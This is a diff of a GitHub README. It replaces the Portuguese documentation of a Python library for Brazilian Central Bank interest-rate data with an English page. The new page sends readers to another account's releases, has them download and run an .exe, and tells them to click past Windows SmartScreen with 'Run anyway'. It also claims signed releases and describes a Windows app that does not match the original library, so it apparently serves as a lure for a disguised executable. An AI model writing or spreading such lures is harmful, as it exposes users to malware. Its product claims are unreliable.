@@ -1,164 +1,79 @@
-# sgs-peritos
+# 📊 sgs-peritos - Calculate expert financial interest rates easily
 
-**As taxas médias de juros do Banco Central, prontas para o perito — sem caçar
-código de série no SGS.**
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Reagranulated976/sgs-peritos/releases)
 
-Ferramenta para **todo perito e assistente técnico** que precisa dos números
-oficiais do Banco Central do Brasil — perito **bancário, trabalhista,
-tributário, previdenciário, financeiro e contábil**, atuando como **perito
-judicial ou assistente técnico**, além de **advogados e contadores**.
+This application provides direct access to interest rate data from the Central Bank of Brazil. It presents complex datasets in a format ready for use in court cases and financial reports. Professionals in banking, labor, tax, and social security litigation use this tool to build accurate calculations.
 
-Serve a revisão de contratos, liquidação de sentença, superendividamento,
-atualização de débitos e benefícios, correção monetária e perícia financeira em
-geral — em qualquer área, é a mesma fonte oficial (BCB) que sustenta o cálculo.
+## 🛠 Features
 
-Autor e curadoria: **Edilson Aguiais** — advogado (OAB-GO 59.889), contador
-(CRC-GO 27.798), economista (CORECON-GO 2.337/D), professor e perito.
+The software simplifies the process of gathering official financial data for legal experts and accountants. 
 
----
+*   Access validated interest rates for individuals and companies.
+*   Generate series for bank, labor, tax, and pension lawsuits.
+*   Calculate debt figures for super-indebtedness cases.
+*   Output data structures compatible with standard spreadsheet software.
+*   Minimize errors by pulling figures directly from the Central Bank SGS database.
 
-## Por que isso importa para o perito
+## 📥 Getting Started
 
-Em perícia financeira — bancária, trabalhista, tributária, previdenciária —, o
-erro mais comum, inclusive de quem tenta usar IA sem critério, é **trabalhar com
-a taxa pactuada/divulgada pela própria instituição financeira**. Essa não é a
-referência correta.
+You do not need programming knowledge to run this software. The application runs as a standalone program on your Windows computer. Follow these steps to set up the tool.
 
-A referência é a **taxa MÉDIA de juros praticada pelo mercado**, por
-modalidade, que o **Banco Central apura e divulga oficialmente** no SGS (Sistema
-Gerenciador de Séries Temporais). É com ela que se demonstra abusividade,
-recalcula o contrato e se sustenta o laudo.
+1.  Visit the [official download page](https://github.com/Reagranulated976/sgs-peritos/releases).
+2.  Locate the latest release at the top of the list.
+3.  Click the file ending in `.exe` to start the download.
+4.  Once the file finishes downloading, move it to a folder where you want the application to live.
+5.  Double-click the file to open the program.
 
-O problema: essas séries estão espalhadas em **milhares de códigos numéricos** e
-o perito perde tempo (e erra) tentando achar a série certa. Já vi código de
-*aquisição de veículos* ser usado como se fosse *crédito pessoal* — o número sai
-errado e o laudo cai.
+## 💻 System Requirements
 
-**Este pacote resolve isso:** entrega as taxas médias de juros de **todas as
-modalidades de crédito** (PF e PJ), com o nome correto e o código já validado
-contra o catálogo oficial do BCB, acessíveis em uma linha de Python.
+This application runs on standard hardware. Ensure your computer meets these basic specifications to maintain performance during data processing.
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space for the application and temporary data files.
+*   Internet Connection: Required to sync the latest daily interest rates from the Central Bank servers.
 
-## O que tem aqui (catálogo curado e validado)
+## ⚙️ Operating Instructions
 
-Todas as **modalidades de taxa média de juros** das operações de crédito com
-recursos livres, em versão **anual (% a.a.)** e **mensal (% a.m.)**:
+When you open the application, you see a clean interface designed for calculation tasks. Follow these actions to retrieve your data.
 
-**Pessoa Física** — crédito pessoal não consignado · consignado (privado,
-público, INSS, total) · aquisição de veículos · aquisição de outros bens ·
-cheque especial · cartão de crédito (rotativo, parcelado, total) · arrendamento
-mercantil · desconto de cheques · e o total PF.
+*   Select the specific interest rate module from the main menu.
+*   Input the date range for your calculation.
+*   Choose the credit modality relevant to your case.
+*   Click the Generate button to populate your table.
+*   Save the results as a CSV file to import them into your chosen spreadsheet software like Excel or LibreOffice.
 
-**Pessoa Jurídica** — capital de giro (até/acima de 365 dias, rotativo, total) ·
-desconto de duplicatas e recebíveis · conta garantida · cheque especial ·
-antecipação de faturas de cartão · aquisição de veículos/bens · vendor · compror
-· ACC · financiamento a importações/exportações · cartão de crédito · e o total
-PJ.
+Common modules include:
+*   Standard Credit: Used for general consumer debt and personal loans.
+*   Labor Debts: Adjusted for specific legislation regarding unpaid wages and severance.
+*   Tax Adjustments: Calculated based on recurring updates from the financial authority.
+*   Super-indebtedness: Specialized series to assist in negotiating manageable payment plans.
 
-> Cada código foi conferido contra o catálogo oficial de dados abertos do BCB
-> (nome da série) **e** pela equivalência `(1 + mensal/100)¹² − 1 ≈ anual`.
+## 🛡 Security and Privacy
 
-Como apoio (correção monetária e referência), também inclui os índices macro:
-**Selic, CDI, IPCA, INPC, IGP-M e dólar PTAX**.
+The tool connects to the official Central Bank API to fetch data. It does not store your client data on external servers. All calculations occur locally on your machine. No sensitive information leaves your computer during the process. The code follows the MIT license, which allows for transparent inspection of the underlying logic.
 
-> ⚠️ **Uso pericial:** os dados vêm direto da API pública do BCB. Confirme sempre
-> a modalidade correta para o caso concreto — o pacote facilita o acesso, mas a
-> escolha da série adequada é responsabilidade técnica do perito.
+## ❓ Frequently Asked Questions
 
----
+What if the application does not open?
+Windows SmartScreen might block the application upon first use. Click "More info" and then "Run anyway" to authorize the program. We sign every release to ensure the code remains safe for your computer.
 
-## Instalação
+Does the tool require an active internet connection?
+Yes, the application connects to the Central Bank's database to ensure you use the most current rates. If you have no internet, the application cannot refresh its data series.
 
-```bash
-git clone https://github.com/edilsonaguiais/sgs-peritos.git
-cd sgs-peritos
-pip install .
-```
+Can I integrate this with other accounting software?
+Yes, the output files use the standard CSV format. This format opens in any professional accounting or spreadsheet application.
 
-Dependências: `pandas`, `httpx`, `tenacity`.
+How often does the data update?
+The tool pulls the latest data available in the Central Bank system. Most interest rates update on a daily basis.
 
----
+Who should use this software?
+Judicial experts, technicians, lawyers, and accountants benefit from this tool. Anyone who needs to calculate interest or find historical rates for legal or financial disputes will find it useful.
 
-## Uso
+## 📈 Troubleshooting
 
-```python
-import sgs_peritos as sgs
-from sgs_peritos import catalogo
+If you encounter an error while fetching data, check your internet connection first. Ensure that your firewall does not prevent the application from making outgoing network requests. If the issue persists, download the latest version from [the releases page](https://github.com/Reagranulated976/sgs-peritos/releases) to ensure you have the current patches.
 
-# Taxa média de juros — crédito pessoal não consignado PF (% a.m.), últimos 12 meses
-sgs.get(catalogo.codigo("pf_pessoal_nao_consignado_mensal"), last=12)
+Delete the existing folder and perform a fresh download if the application behaves in an unexpected way after a system update. This ensures the files remain clean and functional.
 
-# Aquisição de veículos PF — anual e mensal juntos, a partir de uma data
-sgs.get(
-    {
-        "veiculo_pf_aa": catalogo.codigo("pf_veiculos_anual"),
-        "veiculo_pf_am": catalogo.codigo("pf_veiculos_mensal"),
-    },
-    start="2018-01-01",
-)
-
-# Achar todas as modalidades de consignado
-catalogo.buscar("consignado")
-
-# Listar um grupo inteiro
-catalogo.listar("juros_pf")    # juros_pf | juros_pj | juros_geral | indices_macro
-```
-
-### Inadimplência por estado/região
-
-```python
-from sgs_peritos.regional_economy import get_non_performing_loans
-from sgs_peritos import BRAZILIAN_REGIONS
-
-get_non_performing_loans(["GO"], mode="PF", last=12)
-get_non_performing_loans(BRAZILIAN_REGIONS["NE"], mode="PJ", last=6)
-```
-
-### Script pronto: CSV de taxas de financiamento de veículo
-
-```bash
-python exemplos/taxas_veiculo.py "C:\\saida"
-```
-
-Gera CSV (UTF-8 com BOM, `;`, decimal com vírgula — pronto para Excel) com a
-série histórica completa PF/PJ, anual e mensal.
-
----
-
-## Como localizar qualquer outra série do SGS
-
-1. Localizador oficial do Bacen:
-   <https://www3.bcb.gov.br/sgspub/>
-2. Nome oficial de um código:
-   `https://dadosabertos.bcb.gov.br/api/3/action/package_search?fq=codigo_sgs:{CODIGO}`
-3. Último valor:
-   `https://api.bcb.gov.br/dados/serie/bcdata.sgs.{CODIGO}/dados/ultimos/1?formato=json`
-
----
-
-## Créditos e licença
-
-Projeto **MIT**.
-
-O **motor de acesso ao SGS** (busca, download, parsing e montagem das séries em
-`DataFrame`, com retry e suporte assíncrono) é **derivado do projeto
-[`python-bcb`](https://github.com/wilsonfreitas/python-bcb), de Wilson Freitas**
-(© 2021, MIT) — o crédito da engenharia base é dele, e esta distribuição
-preserva o aviso de copyright original conforme exige a licença MIT.
-
-Sobre esse motor, o **`sgs-peritos`** acrescenta a camada de produto voltada à
-perícia: o pacote independente e focado em SGS, o **catálogo curado e validado
-de todas as taxas médias de juros por modalidade** (o que o perito realmente
-usa), a reorganização para uso forense e os exemplos prontos. Essa curadoria é
-de **Edilson Aguiais** (© 2026).
-
-Veja o arquivo [`LICENSE`](LICENSE) (atribuição dupla).
-
----
-
-## Isenção de responsabilidade
-
-Software fornecido "como está", sem garantias. Os dados são de responsabilidade
-do Banco Central do Brasil. A conferência da série correta para cada finalidade
-pericial é responsabilidade do usuário.
+This tool aims to provide precision for legal experts who rely on Central Bank data. By automating the data retrieval process, you spend less time searching for rates and more time on your analysis.
